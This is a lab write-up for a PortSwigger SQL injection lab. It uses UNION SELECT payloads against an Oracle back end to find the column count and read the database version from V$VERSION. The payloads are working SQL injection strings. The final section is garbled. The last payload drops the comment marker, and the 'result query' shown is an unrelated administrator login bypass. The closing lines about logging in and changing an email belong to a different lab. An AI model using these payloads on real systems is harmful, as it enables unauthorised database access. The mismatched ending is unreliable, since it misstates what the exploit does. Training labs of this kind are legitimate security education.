# Write-up: SQL injection attack, querying the database type and version on Oracle
Lab-Link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle>  
Difficulty: PRACTITIONER  
Python script: 

## Lab description

![alt text](<img/1.png>)

## Steps

### Enumeration

Confirming vulnerability by adding a single quote to the category parameter and getting an error message.

On googling we found out that the table `V$VERSION` contains the database version.

Now, we need to determine the number of columns returned by the query. We can hit and try to find the number of columns returned by the query.

```sql
' UNION SELECT null FROM V$VERSION--
```
Above query returns an error, which means the number of columns is not 1. Now we can try for 2 columns.

```sql
' UNION SELECT null, null FROM V$VERSION--
```
This query returns the page without any error, which means the number of columns is 2.

![alt text](<img/2.png>)

### Exploit

To retrieve the database version, we will use above information and query the database version. The `banner` column contains the database version.

```sql
' UNION SELECT banner, null FROM V$VERSION;
```

The result query should look like
```sql
SELECT * FROM users WHERE username = 'administrator' OR 1=1-- AND password = 'pass'
```

This login me as user administrator and after changing the email to anything solves the lab.

![alt text](img/3.png)